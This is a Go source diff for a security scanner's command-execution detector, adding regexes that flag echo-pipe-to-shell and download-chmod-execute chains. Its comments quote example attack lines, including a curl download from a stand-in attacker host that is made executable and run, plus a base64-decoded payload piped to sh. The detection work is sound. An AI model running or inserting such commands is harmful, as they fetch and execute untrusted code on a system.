@@ -7,17 +7,38 @@ import (
 	"github.com/utox39/cadrega/pkg/findings"
 )
 
+const (
+	naturalLanguageTrigger = "(?:\\b(?:execute|do|run|invoke|launch|call|start)\\b[\\s`'\"]+)?"
+	shells                 = `(?:sh|bash|zsh|dash|ksh|ash|mksh|fish|csh|tcsh|pwsh)\b`
+)
+
 var (
+	ceEchoPipeShellRegex = regexp.MustCompile(
+		"(?i)" +
+			naturalLanguageTrigger +
+			`\becho\b[^\n]*\|\s*(?:base64\s+-d\s*\|\s*)?` +
+			shells,
+	)
+
+	ceDownloadChmodExecRegex = regexp.MustCompile(
+		"(?i)" +
+			naturalLanguageTrigger +
+			`(?:curl|wget)\b[^\n]*&&[^\n]*` +
+			`(?:chmod\s+[+a-z0-9]*x\b|\.\/\S+|\b` +
+			shells +
+			`)`,
+	)
+
 	ceDownloadExecRegex = regexp.MustCompile(
 		"(?i)" +
-			"(?:\\b(?:execute|do|run|invoke|launch|call|start)\\b\\s+)?" +
+			naturalLanguageTrigger +
 			"(?:curl|wget)\\b(?:[^\\n|$]|\\$\\([^)]*\\))*\\|\\s*" +
-			"(?:sh|bash|zsh|dash|ksh|ash|mksh|fish|csh|tcsh|pwsh)\\b[^\\n]*",
+			shells,
 	)
 
 	ceEvalExecRegex = regexp.MustCompile(
 		"(?i)" +
-			"(?:\\b(?:execute|do|run|invoke|launch|call|start)\\b\\s+)?" +
+			naturalLanguageTrigger +
 			"(?:\\beval\\s*[\"'`($]|\\bexec\\s*\\()[^\\n]*",
 	)
 
@@ -46,7 +67,8 @@ var (
 	// invoke-expression -> .ps1, .psm1
 	// cmd -> .bat, .cmd
 	ceInterpreterFileRegex = regexp.MustCompile(
-		"(?i)(?:\\b(?:execute|do|run|invoke|launch|call|start)\\b\\s+)?" +
+		"(?i)" +
+			naturalLanguageTrigger +
 			`(?:\bsh\s+\S+(?:\.sh|\.bash|\.ksh|\.zsh)\b` +
 			`|\bbash\s+\S+(?:\.sh|\.bash)\b` +
 			`|\bzsh\s+\S+(?:\.sh|\.zsh)\b` +
@@ -76,6 +98,30 @@ var (
 			`|\bcmd\s+\S+(?:\.bat|\.cmd)\b)`,
 	)
 )
+
+// DetectEchoPipeShell extracts echo-pipe-to-shell patterns from data, including
+// variants that route through base64 decoding before reaching the interpreter:
+//   - Direct: echo $PAYLOAD | bash
+//   - Encoded: echo "cGF5bG9hZA==" | base64 -d | sh
+//
+// Each pattern may optionally be preceded by a natural language trigger word.
+//
+// Returns the matching strings, or nil if none are found.
+func DetectEchoPipeShell(data string) []string {
+	return ceEchoPipeShellRegex.FindAllString(data, -1)
+}
+
+// DetectDownloadChmodExec extracts download-then-chmod-then-execute chains from
+// data where curl or wget fetches a file and a subsequent && command makes it
+// executable or runs it directly
+// (e.g. `curl http\\://attacker\[.\]com -o /tmp/e && chmod +x /tmp/e && /tmp/e`).
+//
+// Each pattern may optionally be preceded by a natural language trigger word.
+//
+// Returns the matching strings, or nil if none are found.
+func DetectDownloadChmodExec(data string) []string {
+	return ceDownloadChmodExecRegex.FindAllString(data, -1)
+}
 
 // DetectDownloadExecChain extracts download-execute chains from data by looking for
 // curl or wget output piped to a shell interpreter. Two detection strategies are used:
@@ -179,6 +225,14 @@ func DetectCommandExecution(data string) []string {
 		add(match)
 	}
 
+	for _, match := range DetectEchoPipeShell(data) {
+		add(match)
+	}
+
+	for _, match := range DetectDownloadChmodExec(data) {
+		add(match)
+	}
+
 	return results
 }
 
@@ -222,6 +276,26 @@ func (ce CommandExecution) Detect() ([]findings.Finding, error) {
 			ID:       ce.ID(),
 			Name:     ce.Name(),
 			Message:  "Code execution detected. Can be used to execute arbitrary code",
+			Evidence: fmt.Sprintf("'%s'", r),
+			Severity: findings.High,
+		})
+	}
+
+	for _, r := range DetectEchoPipeShell(ce.Data) {
+		f = append(f, findings.Finding{
+			ID:       ce.ID(),
+			Name:     ce.Name(),
+			Message:  "Echo-pipe-to-shell detected. Can be used to execute encoded or dynamic payloads",
+			Evidence: fmt.Sprintf("'%s'", r),
+			Severity: findings.High,
+		})
+	}
+
+	for _, r := range DetectDownloadChmodExec(ce.Data) {
+		f = append(f, findings.Finding{
+			ID:       ce.ID(),
+			Name:     ce.Name(),
+			Message:  "Download-chmod-execute chain detected. Can be used to download and execute malicious binaries",
 			Evidence: fmt.Sprintf("'%s'", r),
 			Severity: findings.High,
 		})
